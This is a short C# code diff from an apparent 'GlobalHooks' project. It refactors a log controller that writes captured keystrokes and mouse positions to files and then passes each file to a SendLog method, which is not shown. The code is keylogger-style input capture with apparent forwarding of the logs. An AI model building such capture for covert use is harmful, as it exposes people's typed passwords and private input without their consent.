@@ -1,7 +1,8 @@
 ﻿using System;
 using System.IO;
+using GlobalHooks.Model;
 
-namespace GlobalHooks
+namespace GlobalHooks.Controllers
 {
     class LogFileController
     {
@@ -24,7 +25,6 @@ namespace GlobalHooks
                 using (var writer = new StreamWriter(MouseLogFilePath, true))
                 {
                     writer.WriteLine($"{DateTime.Now} : Key: {paramArray[0]}, Position: {paramArray[1]}");
-                    writer.Dispose();
                 }
                 SendLog(MouseLogFilePath);
             }
@@ -37,7 +37,6 @@ namespace GlobalHooks
                 using (var writer = new StreamWriter(KeyboardLogFilePath, true))
                 {
                     writer.WriteLine($"{DateTime.Now} : Key: {(string)key}");
-                    writer.Dispose();
                 }
                 SendLog(KeyboardLogFilePath);
             }
